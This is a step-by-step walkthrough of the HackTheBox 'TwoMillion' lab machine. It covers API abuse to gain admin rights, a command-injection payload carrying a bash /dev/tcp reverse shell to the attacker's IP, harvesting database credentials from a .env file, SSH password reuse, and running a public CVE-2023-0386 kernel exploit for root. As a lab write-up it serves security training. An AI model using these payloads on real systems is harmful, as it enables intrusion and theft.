# TwoMillion - HackTheBox Complete Walkthrough

**Machine IP:** 10.10.11.221  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** December 5, 2025

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Initial Access](#initial-access)
4. [Privilege Escalation - User](#privilege-escalation-user)
5. [Privilege Escalation - Root](#privilege-escalation-root)
6. [Flags](#flags)

---

## Reconnaissance

### Host Discovery & Port Scanning

**What is Reconnaissance?**
Reconnaissance is the first phase of penetration testing where we gather information about our target. Think of it like scouting before a battle - we need to know what we're dealing with.

**Step 1: Adding the Target to /etc/hosts**

The `/etc/hosts` file maps domain names to IP addresses on your local machine. This is necessary because the target website expects requests to come to `2million.htb`, not just the IP address.

```bash
echo "10.10.11.221 2million.htb" | sudo tee -a /etc/hosts
```

**Breaking down this command:**
- `echo "10.10.11.221 2million.htb"` - Creates the text we want to add
- `|` - Pipes (sends) the output to the next command
- `sudo` - Runs the command with administrator privileges (required to modify system files)
- `tee -a /etc/hosts` - Appends the text to the /etc/hosts file

**Verify it worked:**
```bash
tail -1 /etc/hosts
# Should show: 10.10.11.221 2million.htb
```

**Step 2: Port Scanning with Nmap**

Nmap is a network scanner that helps us discover which ports (doors) are open on the target machine and what services are running behind them.

```bash
sudo nmap -p- --min-rate=10000 -T5 -sCV -Pn 10.10.11.221 -oN nmap_full.txt
```

**Understanding each flag:**
- `sudo` - Required for certain scan types (SYN scan)
- `nmap` - The scanning tool
- `-p-` - Scan ALL 65535 ports (not just common ones)
- `--min-rate=10000` - Send at least 10,000 packets per second (faster scanning)
- `-T5` - Timing template 5 (most aggressive, fastest)
- `-sC` - Run default NSE scripts (safe scripts for service detection)
- `-sV` - Detect service versions (what software is running)
- `-Pn` - Skip ping check (assume host is up)
- `10.10.11.221` - The target IP address
- `-oN nmap_full.txt` - Save output to a file named nmap_full.txt

**This scan will take 1-3 minutes. Wait for it to complete.**

**Results:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 13:55 UTC
Nmap scan report for 2million.htb (10.10.11.221)
Host is up (0.048s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-trane-info: Problem with XML parsing of /evox/about
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Hack The Box :: Penetration Testing Labs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open Ports:**
- **22/SSH** - OpenSSH 8.9p1 (Secure Shell - for remote login)
- **80/HTTP** - nginx (Web server running PHP application with PHPSESSID cookies)

**What does this mean?**
- Port 22 is SSH - we might be able to login here later if we find credentials
- Port 80 is HTTP - there's a website we can explore
- The website uses PHP and nginx, which tells us about the technology stack
- PHPSESSID means the site uses PHP sessions (we'll need this for authentication later)

---

## Enumeration

**What is Enumeration?**
Enumeration is the process of actively gathering more detailed information about the target. Now that we know there's a website on port 80, we need to explore it thoroughly.

### Web Application Discovery

**Step 3: First, Let's Visit the Website**

Open a browser and go to:
```
http://2million.htb
```

You'll see a HackTheBox-themed website. Browse around and note:
- There's a login page
- There's a join/register button, but it asks for an invite code
- Look at the page structure and functionality

**Step 4: Finding Hidden Endpoints**

Many websites have pages that aren't directly linked. Instead of randomly guessing (directory brute-forcing), let's be smart and look for clues in the website's source code.

**Why does this work?**
Developers often reference pages in JavaScript files, even if those pages aren't linked in the visible navigation. We're going to search for common patterns like `/api`, `/admin`, `/user`, etc.

```bash
curl -s http://2million.htb | grep -oE "/(api|admin|user|register|invite)[a-zA-Z0-9/_-]*" | sort -u
```

**Breaking down this command:**
- `curl -s http://2million.htb` - Downloads the HTML of the homepage quietly
- `|` - Pipes the output to the next command
- `grep -oE "pattern"` - Searches for text matching our pattern
  - `-o` - Only show the matching part
  - `-E` - Use extended regex (regular expressions)
- `"/(api|admin|user|register|invite)[a-zA-Z0-9/_-]*"` - The pattern we're looking for
  - Matches paths starting with /api, /admin, /user, /register, or /invite
  - Followed by any letters, numbers, slashes, underscores, or hyphens
- `sort -u` - Sort results and remove duplicates

**Result:**
```
/invite
```

**Success!** We found a hidden page: `/invite`

**Key Finding:** The `/invite` page is not linked directly in the navigation but was discovered through source code analysis. This is a common technique in web application testing.

**Step 5: Exploring the /invite Page**

Now let's visit this page:
```
http://2million.htb/invite
```

**What you'll see:**
- A page asking for an invite code
- Not much else visible on the surface

**But here's the trick:** Web applications often have JavaScript files that contain interesting functionality. Let's check the page source.

**To view page source:**
- **Firefox/Chrome:** Press `Ctrl + U` or right-click → "View Page Source"
- Look for `<script>` tags

You'll find a reference to:
```
/js/inviteapi.min.js
```

**Step 6: Analyzing the JavaScript File**

JavaScript files often contain API endpoints, function names, and logic. Let's download and examine this file:

```bash
curl -s http://2million.htb/js/inviteapi.min.js
```

**Breaking down this command:**
- `curl` - Tool for making HTTP requests
- `-s` - Silent mode (don't show progress bar)
- `http://2million.htb/js/inviteapi.min.js` - The URL of the JavaScript file

**Output (obfuscated):**
```javascript
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

**What is this?**
This is **obfuscated JavaScript** - code that's been intentionally made hard to read. Developers do this to "hide" their code logic.

**How to deobfuscate it:**
1. Look at the last part: `'response|function|log|console|code|...'` - these are the real strings
2. The code replaces numbers with these strings
3. You can paste this into a JavaScript console or use online deobfuscators

**Or we can look at the string patterns to figure it out:**
- We see: `api/v1`, `invite`, `how`, `to`, `generate`, `verify`
- We see function names: `verifyInviteCode`, `makeInviteCode`
- We see HTTP method: `POST`

**Deobfuscated Functions:**
1. `verifyInviteCode(code)` - Verifies an invite code
2. `makeInviteCode()` - Returns hints about generating invite codes

**Answer to HTB Question:** `makeInviteCode` (without parentheses)

**Step 7: Understanding What We Found**

The `makeInviteCode()` function makes an AJAX call (JavaScript way of making HTTP requests) to:
```
/api/v1/invite/how/to/generate
```

This is an API endpoint! APIs (Application Programming Interfaces) are like backdoors that let programs communicate with the server.

### Calling the API

**Step 8: Making Our First API Request**

Instead of using JavaScript in the browser, we can directly call this API endpoint using `curl`:

```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate
```

**Breaking down this command:**
- `curl` - Makes HTTP requests
- `-X POST` - Specifies the HTTP method (POST, not GET)
  - **POST** is used to send data or trigger actions
  - **GET** is used to retrieve data
- `http://2million.htb/api/v1/invite/how/to/generate` - The API endpoint URL

**Press Enter and watch what happens!**

**Response:**
```json
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

**Excellent! We got a response!**

**Understanding the response:**
- `"success": 1` - The request worked
- `"data": "Va beqre gb..."` - This is the encrypted message
- `"enctype": "ROT13"` - This tells us the encryption type
- The hint confirms we need to decrypt it

**What is ROT13?**
ROT13 (Rotate by 13) is a simple cipher where each letter is replaced with the letter 13 positions ahead/behind in the alphabet:
- A → N, B → O, C → P, etc.
- N → A, O → B, P → C, etc.

It's very easy to decrypt!

### Decrypting ROT13

**Step 9: Decrypting the Message**

We'll use the `tr` command (translate) which can shift characters:

```bash
echo "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**Breaking down this command:**
- `echo "..."` - Outputs the encrypted text
- `|` - Pipes it to the next command
- `tr 'A-Za-z' 'N-ZA-Mn-za-m'` - Translates characters
  - `'A-Za-z'` - From these characters (all letters)
  - `'N-ZA-Mn-za-m'` - To these characters (shifted by 13)
  - This effectively rotates each letter by 13 positions

**Decrypted Message:**
```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

**Perfect!** The message is now readable. It's telling us exactly what to do next: make a POST request to another endpoint.

### Generating Invite Code

**Step 10: Generating the Actual Invite Code**

Now we know the next endpoint to call. Let's do it:

```bash
curl -X POST http://2million.htb/api/v1/invite/generate
```

**This is the same type of request as before, just to a different endpoint.**

**Response:**
```json
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "QUZBNFktUVcwMVQtU1dBWVQtSFpPMlg=",
    "format": "encoded"
  }
}
```

**Great! We got a code!** But notice:
- `"format": "encoded"` - It's encoded (not encrypted, just encoded)
- The code looks like: `QUZBNFktUVcwMVQtU1dBWVQtSFpPMlg=`
- That `=` at the end is a clue - this is **Base64 encoding**

**What is Base64?**
Base64 is a way to represent binary data using only letters, numbers, and a few symbols. It's commonly used to transfer data safely. The `=` padding at the end is a characteristic of Base64.

### Decoding Base64 Invite Code

**Step 11: Decoding the Invite Code**

Let's decode the Base64 string to get our actual invite code:

```bash
echo "QUZBNFktUVcwMVQtU1dBWVQtSFpPMlg=" | base64 -d
```

**Breaking down this command:**
- `echo "..."` - Outputs the encoded string
- `|` - Pipes it to the next command
- `base64 -d` - Decodes Base64
  - `-d` means "decode" (use `-e` to encode)

**Result:**
```
AFA4Y-QW01T-SWAYT-HZO2X
```

**Excellent! This is our invite code!** Save this - we'll need it in the next step.

**Your invite code will be different** because the server generates a new one each time. Use the one you generated, not this example.

---

## Initial Access

**What is Initial Access?**
Now that we have an invite code, we can create an account and start interacting with the application as an authenticated user. This is our "foothold" into the system.

### User Registration

**Step 12: Creating an Account**

We could use the web interface, but since we're already working with the API, let's register directly via the API:

```bash
curl -X POST http://2million.htb/api/v1/user/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","email":"hack@hacker.com","password":"hacker","invite_code":"AFA4Y-QW01T-SWAYT-HZO2X"}'
```

**Breaking down this command:**
- `curl -X POST` - Making a POST request (sending data)
- `http://2million.htb/api/v1/user/register` - The registration endpoint
- `-H "Content-Type: application/json"` - Tells the server we're sending JSON data
  - `-H` means "header" (metadata about our request)
  - JSON (JavaScript Object Notation) is a common data format
- `-d '{...}'` - The data we're sending (our registration information)
  - `-d` means "data"
  - The `{...}` is a JSON object with our username, email, password, and invite code
- **IMPORTANT:** Replace `AFA4Y-QW01T-SWAYT-HZO2X` with YOUR invite code from Step 11

**The backslash `\`** at the end of lines allows us to split one long command across multiple lines for readability. You can also write it all on one line.

**If successful, you'll get a response confirming registration.**

**Credentials We Created:**
- Username: `hacker`
- Email: `hack@hacker.com`
- Password: `hacker`

**Note:** You can use different credentials if you want. Remember what you choose!

### Login and Session Management

**Step 13: Logging In**

Now that we have an account, we need to log in to get a **session cookie**. 

**What is a session cookie?**
When you log into a website, the server gives you a cookie (a small piece of data) that identifies your session. You send this cookie with every request to prove you're logged in. Think of it like a ticket that shows you paid for admission.

```bash
curl -X POST http://2million.htb/api/v1/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"hack@hacker.com","password":"hacker"}' \
  -c cookies.txt -v
```

**Breaking down this command:**
- `-X POST` - POST request (sending login credentials)
- `-H "Content-Type: application/json"` - We're sending JSON
- `-d '{"email":"...","password":"..."}'` - Our login credentials (use YOUR credentials)
- `-c cookies.txt` - **Save cookies to a file** named cookies.txt
  - This is important! We need this cookie for future requests
- `-v` - Verbose mode (shows more details including headers)

**Look for this in the output:**
```
< Set-Cookie: PHPSESSID=krncqeqpdm0s9m9ppki08jv53j; path=/
```

**Your Session Cookie:**
```
PHPSESSID=krncqeqpdm0s9m9ppki08jv53j
```

**Your cookie value will be different!** It's randomly generated for your session.

**Verify the cookie was saved:**
```bash
cat cookies.txt
```

You should see your PHPSESSID value saved in the file.

### API Endpoint Discovery

**Step 14: Discovering All API Endpoints**

Now that we're logged in, we can explore what the API offers. Many APIs have a "documentation" or "list" endpoint that shows all available routes.

**Let's check the main API endpoint:**
```bash
curl -s http://2million.htb/api/v1 -H "Cookie: PHPSESSID=YOUR_SESSION_COOKIE_HERE" | jq .
```

**IMPORTANT:** Replace `YOUR_SESSION_COOKIE_HERE` with your actual PHPSESSID value from Step 13!

**Or, use the cookie file directly:**
```bash
curl -s http://2million.htb/api/v1 -b cookies.txt | jq .
```

**Breaking down this command:**
- `-s` - Silent mode (no progress bar)
- `http://2million.htb/api/v1` - The main API endpoint
- `-H "Cookie: PHPSESSID=..."` - Send our session cookie with the request
  - This proves we're logged in
- OR use `-b cookies.txt` - Read cookies from the file we saved
- `| jq .` - Format the JSON output nicely
  - `jq` is a JSON processor that makes the output readable
  - If you don't have `jq`, install it: `sudo apt install jq`
  - Or remove `| jq .` to see unformatted output

**API Endpoints (Full List):**
```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

**Answer to HTB Question:** There are **3 admin endpoints** under `/api/v1/admin`.

**Key Observations:**
- There are regular user endpoints (under "user")
- There are admin endpoints (under "admin")
- The admin endpoints have different HTTP methods: GET, POST, PUT
- Notice `/api/v1/admin/settings/update` - this updates user settings!

### Privilege Escalation to Admin

**What is Privilege Escalation?**
Privilege escalation is when we elevate our access from a low-privilege user to a higher-privilege user (like admin). We're currently a regular user, but we want admin powers!

**Step 15: Checking If We're Admin**

First, let's verify we're not already an admin:

```bash
curl -s http://2million.htb/api/v1/admin/auth \
  -b cookies.txt
```

**Result:** `false` (we're not admin)

This endpoint returns whether the current user is an admin or not.

**Step 16: Exploiting the Settings Update Endpoint**

Here's the vulnerability: The `/api/v1/admin/settings/update` endpoint allows us to update user settings, but it doesn't properly check if we're allowed to make ourselves admin!

**This is called an IDOR (Insecure Direct Object Reference) vulnerability** - we can modify our own permissions because the application doesn't validate properly.

**Let's exploit it:**

This endpoint uses the **PUT** HTTP method (used for updates), and we can set `is_admin` to `1`:

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"email":"hack@hacker.com","is_admin":1}'
```

**Breaking down this command:**
- `-X PUT` - Using the PUT HTTP method (for updates)
- `-b cookies.txt` - Send our session cookie
- `-H "Content-Type: application/json"` - We're sending JSON
- `-d '{"email":"hack@hacker.com","is_admin":1}'` - The payload
  - `email` - Our email address
  - `is_admin` - Set to 1 (true)

**Response:**
```json
{
  "id": 13,
  "username": "hacker",
  "is_admin": 1
}
```

**Success!** The response shows `"is_admin": 1` - we're now an admin!

**Step 17: Verify We're Admin**

Let's double-check by calling the auth endpoint again:

```bash
curl -s http://2million.htb/api/v1/admin/auth \
  -b cookies.txt
```

**Result:** `true` (now admin!)

**Excellent! We've successfully escalated our privileges from a regular user to admin!**

### Command Injection Vulnerability

**What is Command Injection?**
Command injection is a vulnerability where user input is passed directly to system commands without proper filtering. If an application runs system commands (like generating files, processing data), and we can control part of that command, we can inject our own commands!

**Think of it like this:**
- Application wants to run: `generate_vpn USERNAME`
- We provide username: `hacker;whoami`
- Application actually runs: `generate_vpn hacker;whoami`
- The semicolon `;` ends the first command and starts a new one!

**Step 18: Testing for Command Injection**

The `/api/v1/admin/vpn/generate` endpoint generates VPN configuration files. This likely involves running system commands. Let's test if we can inject our own commands:

**Test #1 - Using Semicolon:**

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker;whoami"}'
```

**Breaking down the payload:**
- `"username":"hacker;whoami"` - We're injecting `whoami` command
- `whoami` is a Linux command that prints the current user
- If command injection works, the server will execute both commands

**Look at the response!** If you see a username like `www-data` in the output, command injection works!

**Test #2 - Using Backticks:**

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker`whoami`"}'
```

**Command Injection Confirmed!** Both methods work.

**Understanding Different Injection Methods:**

There are several ways to inject commands in Linux:

1. **Semicolon (;)** - Chains commands sequentially
   - Example: `command1; command2`
   - Both commands run independently
   - Best for our reverse shell!

2. **Backticks (\`)** - Command substitution
   - Example: `command1 \`command2\``
   - Replaces `` `command2` `` with its output
   - Then passes that output to command1

3. **Other methods:**
   - `&&` - Run second command only if first succeeds
   - `||` - Run second command only if first fails
   - `|` - Pipe output of first to second
   - `$(command)` - Same as backticks (command substitution)

### Getting Reverse Shell

**What is a Reverse Shell?**
A reverse shell is when the target machine connects back to us, giving us a command line (shell) on their system. Instead of us connecting to them (which firewalls might block), they connect to us!

**Step 19: Setting Up a Listener**

First, we need to listen for the incoming connection. Open a **NEW terminal window** and run:

```bash
nc -lvnp 4444
```

**Breaking down this command:**
- `nc` - Netcat, a networking tool
- `-l` - Listen mode (wait for connections)
- `-v` - Verbose (show details)
- `-n` - No DNS lookup (faster)
- `-p 4444` - Listen on port 4444

**Keep this terminal open!** You should see:
```
listening on [any] 4444 ...
```

**Step 20: Injecting the Reverse Shell**

Now, in your **ORIGINAL terminal**, inject a reverse shell command:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker;bash -c \"bash -i >& /dev/tcp/10.10.14.56/4444 0>&1\""}'
```

**IMPORTANT:** Replace `10.10.14.56` with **YOUR HTB VPN IP** (the one you noted earlier)!

**Breaking down the payload:**
- `hacker;` - Legitimate username, then semicolon to end that command
- `bash -c "..."` - Run bash with a command
- `bash -i` - Interactive bash shell
- `>& /dev/tcp/10.10.14.56/4444` - Redirect output to a TCP connection to our IP:port
- `0>&1` - Redirect input to the same connection

**What happens:**
1. The server executes this command
2. It connects back to your listening netcat
3. You get a shell!

**Check your listener terminal!** You should see:
```
connect to [10.10.14.56] from (UNKNOWN) [10.10.11.221] 12345
www-data@2million:/$
```

**Congratulations! You have a shell as the `www-data` user!**

### Shell Stabilization

**Why stabilize the shell?**
The initial shell is "dumb" - no arrow keys, no tab completion, and Ctrl+C will kill it. Let's make it better!

**Step 21: Making the Shell Interactive**

In your reverse shell, run these commands:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

This spawns a proper bash shell using Python's PTY (pseudo-terminal) module.

**Now press:**
```
Ctrl+Z
```

This backgrounds the shell. You'll see your normal terminal again.

**Type this command quickly:**
```bash
stty raw -echo; fg
```

Then press **Enter** twice.

**What this does:**
- `stty raw -echo` - Sets your terminal to raw mode (passes all keys through)
- `fg` - Brings the backgrounded shell back to foreground

**Finally, set the terminal type:**
```bash
export TERM=xterm
```

**Now you have a fully interactive shell!** You can:
- Use arrow keys
- Use tab completion
- Clear the screen with Ctrl+L
- Use Ctrl+C without killing the shell

---

## Privilege Escalation - User

**What's Next?**
We have a shell as `www-data` (the web server user), but we want to become a regular user with more privileges. We need to find credentials!

### Enumeration as www-data

**Step 22: Understanding Our Current Situation**

Let's check who we are and where we are:

```bash
whoami
```
**Output:** `www-data` (the web server user - low privileges)

```bash
hostname
```
**Output:** `2million` (the machine name)

```bash
id
```
This shows our user ID, group ID, and what groups we belong to.

```bash
pwd
```
**Output:** `/var/www/html` (the web root directory)

```bash
ls -la
```
This lists all files in the current directory (including hidden files starting with `.`)

**Step 23: Looking for Other Users**

Let's see what user accounts exist on this system:

```bash
cat /etc/passwd | grep -E '/bin/(bash|sh)$'
```

**What this does:**
- `cat /etc/passwd` - Shows all user accounts
- `grep -E '/bin/(bash|sh)$'` - Filters for users with actual shells
  - Most service accounts can't login
  - Users with `/bin/bash` or `/bin/sh` can login

**Also check home directories:**
```bash
ls -la /home/
```

This shows what users have home directories. These are likely the real users.

### Finding Credentials

**Step 24: Searching for Credentials**

Web applications often store sensitive information in configuration files. For PHP applications, there's a common file called `.env` (environment file).

**Answer to HTB Question:** The file commonly used in PHP applications to store environment variables is **`.env`**

**Why is this important?**
The `.env` file typically contains:
- Database credentials
- API keys  
- Secret passwords
- Other sensitive configuration

**Let's find it:**

```bash
find /var/www -name ".env" 2>/dev/null
```

**Breaking down this command:**
- `find` - Search for files
- `/var/www` - Start searching in the web root
- `-name ".env"` - Look for files named exactly ".env"
- `2>/dev/null` - Hide error messages (redirect errors to nowhere)

**Read the .env file:**
```bash
cat /var/www/html/.env
```

**Contents of .env:**
```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

**Excellent! We found database credentials!**

**Credentials Found:**
- Username: `admin`
- Password: `SuperDuperPass123`

**Why is this useful?**
People often reuse passwords! Let's try using this password to login as the `admin` user.

### Lateral Movement to Admin User

**What is Lateral Movement?**
Lateral movement is moving from one user to another on the same system. We're currently `www-data`, but we want to become `admin`.

**Step 25: Attempting SSH Login**

We have a potential password. Let's try SSH'ing as the `admin` user:

**Option 1: From your attacking machine (open a new terminal):**
```bash
ssh admin@2million.htb
```

When prompted for a password, type:
```
SuperDuperPass123
```

**Option 2: From the www-data shell:**
```bash
su admin
```
Type the password when prompted.

**Success!** The password works! We're now logged in as the `admin` user.

**Why did this work?**
The `admin` database user reused their system password. This is a common security mistake - credential reuse!

### User Flag

**Step 26: Getting the User Flag**

Now that we're the `admin` user, we can read the user flag:

```bash
cat ~/user.txt
```

**Breaking down this command:**
- `~` - Shortcut for the current user's home directory (`/home/admin`)
- `user.txt` - The file containing the user flag

**Copy this flag and submit it to HackTheBox!** 🎯

**Alternative ways to read it:**
```bash
cat /home/admin/user.txt
ls -la ~  # See all files in home directory
```

---

## Privilege Escalation - Root

**What's the Goal Now?**
We're the `admin` user, but we want to become `root` (the superuser with unlimited privileges). This is the final step!

### Enumeration as Admin

**Step 27: Checking for Easy Wins**

Let's look for common privilege escalation vectors:

**Check if we can run commands as root:**
```bash
sudo -l
```

**What this does:**
- Lists commands we're allowed to run with `sudo` (superuser privileges)
- If we can run something as root, we might exploit it

**Check for SUID binaries:**
```bash
find / -perm -4000 -type f 2>/dev/null
```

**What are SUID binaries?**
- SUID (Set User ID) means the program runs with the owner's permissions, not yours
- If a SUID binary is owned by root, it runs as root!
- Sometimes these can be exploited to get root access

**Check admin's files:**
```bash
ls -la ~/
```

Look for interesting files in the admin's home directory.

```bash
cat ~/.bash_history
```

The bash history might show commands the admin ran - could reveal secrets!

**Step 28: Checking Email**

On Linux systems, local mail is often stored in `/var/mail/`. Let's check if admin has mail:

```bash
ls -la /var/mail/
```

**Read admin's email:**
```bash
cat /var/mail/admin
```

**Why check email?**
- System administrators receive important notifications
- May contain hints, passwords, or vulnerability information
- This is a common place to find clues in CTFs

### Email Discovery

**After reading the email, you'll find important information!**

**Email Content Summary:**
The email discusses a recent security vulnerability. It mentions:
- A kernel vulnerability from **2023**
- Related to **OverlayFS** (a Linux file system)
- Allows attackers to move files while maintaining metadata (owner, SetUID bits)
- This is a serious privilege escalation vulnerability!

**Answer to HTB Question:** The CVE ID mentioned is **CVE-2023-0386**

**What is a CVE?**
CVE (Common Vulnerabilities and Exposures) is a standardized identifier for known security vulnerabilities. CVE-2023-0386 is a specific Linux kernel vulnerability from 2023.

### Exploiting CVE-2023-0386

**What is CVE-2023-0386?**
This is a Linux kernel vulnerability in the OverlayFS file system that was discovered in 2023. It allows a regular user to escalate privileges to root by exploiting how the kernel handles file permissions in overlay file systems.

**Step 29: Getting the Exploit**

We need to download the exploit code. On your **attacking machine** (not the target), open a terminal:

```bash
git clone https://github.com/xkaneiki/CVE-2023-0386.git
```

**What this does:**
- Downloads the exploit code from GitHub
- Creates a directory called `CVE-2023-0386` with all the files

**Step 30: Preparing the Exploit for Transfer**

The exploit is in the `/tmp/CVE-2023-0386` directory on your attacking machine (if you followed along earlier). If not, navigate to where you cloned it.

Let's compress it for easier transfer:

```bash
cd CVE-2023-0386
tar czf CVE-2023-0386.tar.gz *
```

**Breaking down this command:**
- `tar` - Archive tool
- `c` - Create archive
- `z` - Compress with gzip
- `f CVE-2023-0386.tar.gz` - Output filename
- `*` - Include all files

**Step 31: Transferring to Target**

Now we'll use SCP (Secure Copy) to transfer the file via SSH:

```bash
scp CVE-2023-0386.tar.gz admin@2million.htb:/tmp/
```

**When prompted, enter the password:** `SuperDuperPass123`

**Breaking down this command:**
- `scp` - Secure copy (like cp but over SSH)
- `CVE-2023-0386.tar.gz` - The file to transfer
- `admin@2million.htb` - Login as admin
- `:/tmp/` - Copy to the /tmp directory on the target

**Step 32: Extracting and Compiling**

Now, in your SSH session as **admin** on the target machine:

```bash
cd /tmp
tar xzf CVE-2023-0386.tar.gz
ls -la
```

**What this does:**
- `cd /tmp` - Go to tmp directory
- `tar xzf` - Extract (x) gzipped (z) archive from file (f)
- `ls -la` - Verify files were extracted

**Compile the exploit:**
```bash
make all
```

**What this does:**
- `make` - Build tool that compiles C code
- `all` - Target in the Makefile (compiles all components)

**This will create executables:**
- `fuse` - Sets up the FUSE filesystem
- `exp` - The actual exploit

**If you get errors about missing packages, install gcc:**
```bash
sudo apt install gcc make
```

### Running the Exploit

**Important:** This exploit requires **TWO terminal sessions** running simultaneously!

**Why two terminals?**
The exploit has two parts:
1. A FUSE filesystem that sets up the vulnerable conditions
2. The exploit that takes advantage of those conditions

Both need to run at the same time to work.

**Step 33: Opening Two SSH Sessions**

**Terminal 1 (your current SSH session as admin):**

Run the FUSE filesystem component:

```bash
cd /tmp/CVE-2023-0386
./fuse ./ovlcap/lower ./gc
```

**What this does:**
- Starts a FUSE (Filesystem in Userspace) mount
- Creates the vulnerable overlay filesystem
- **This will keep running** - don't close it!

**You'll see it running but not returning to a prompt. This is expected!**

**Terminal 2 (open a NEW terminal on your attacking machine):**

SSH to the target again:

```bash
ssh admin@2million.htb
# Password: SuperDuperPass123
```

Once logged in, run the exploit:

```bash
cd /tmp/CVE-2023-0386
./exp
```

**What happens:**
- The exploit takes advantage of the vulnerable filesystem created by Terminal 1
- It creates a SUID binary owned by root
- It spawns a root shell!

**Result:** Root shell obtained!

**Step 34: Verify You're Root**

In Terminal 2, check who you are now:

```bash
whoami
```
**Output:** `root`

```bash
id
```
**Output:** `uid=0(root) gid=0(root) groups=0(root)`

**Congratulations! You're now root - the most powerful user!** 🎉

### Root Flag

**Step 35: Getting the Root Flag**

Now that you're root, you can read the root flag:

```bash
cat /root/root.txt
```

**Breaking down this command:**
- `/root/` - Root's home directory (only root can access)
- `root.txt` - The final flag file

**Copy this flag and submit it to HackTheBox!** 🏆

**You've successfully completed the TwoMillion box!**

---

## Flags

### User Flag
```bash
cat /home/admin/user.txt
```

### Root Flag
```bash
cat /root/root.txt
```

---

## Summary

### Attack Chain

1. **Reconnaissance** - Nmap scan revealed SSH (22) and HTTP (80)
2. **Web Enumeration** - Found hidden `/invite` page via source code analysis
3. **JavaScript Analysis** - Discovered `makeInviteCode()` function in `inviteapi.min.js`
4. **API Exploitation** - Called `/api/v1/invite/how/to/generate` to get encrypted hint
5. **ROT13 Decryption** - Decoded hint to find `/api/v1/invite/generate` endpoint
6. **Invite Generation** - Generated Base64-encoded invite code
7. **Account Creation** - Registered account with decoded invite code
8. **API Discovery** - Listed all endpoints via `/api/v1`
9. **Privilege Escalation (Web)** - Exploited `/api/v1/admin/settings/update` to become admin
10. **Command Injection** - Exploited `/api/v1/admin/vpn/generate` for RCE
11. **Reverse Shell** - Gained shell as `www-data`
12. **Credential Discovery** - Found database credentials in `.env` file
13. **Lateral Movement** - SSH'd as `admin` using reused password
14. **Kernel Exploitation** - Used CVE-2023-0386 (OverlayFS) to escalate to root

### Key Vulnerabilities

1. **Insecure Direct Object Reference (IDOR)** - Privilege escalation via `/api/v1/admin/settings/update`
2. **Command Injection** - RCE via `/api/v1/admin/vpn/generate`
3. **Credential Reuse** - Database password worked for SSH
4. **Kernel Vulnerability** - CVE-2023-0386 (OverlayFS privilege escalation)

### Tools Used

- `nmap` - Port scanning
- `curl` - HTTP requests and API interaction
- `grep` - Pattern matching for endpoint discovery
- `tr` - ROT13 decryption
- `base64` - Decode invite code
- `nc` - Reverse shell listener
- `ssh` - Lateral movement
- `CVE-2023-0386 exploit` - Root privilege escalation

### Commands Reference

**ROT13 Decryption:**
```bash
echo "encrypted_text" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**Base64 Decoding:**
```bash
echo "encoded_string" | base64 -d
```

